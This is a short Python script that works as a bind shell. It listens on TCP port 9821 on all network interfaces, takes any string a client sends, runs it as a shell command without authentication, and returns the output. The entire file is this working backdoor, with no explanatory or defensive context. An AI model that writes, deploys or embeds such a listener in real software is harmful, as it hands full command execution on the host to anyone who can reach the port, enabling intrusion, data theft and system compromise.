import socket
import subprocess

def server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('', 9821))
    sock.listen(5)
    print("[*] Waiting for connections!...")

    while True:
        conn, addr = sock.accept()
        print(f"[*] Connection from {addr}")

        command = conn.recv(4096).decode()

        if command.lower() == "exit":
            break

        try:
            output = subprocess.getoutput(command)
        except Exception as e:
            output = str(e)

        conn.send(output.encode())
        conn.close()

server()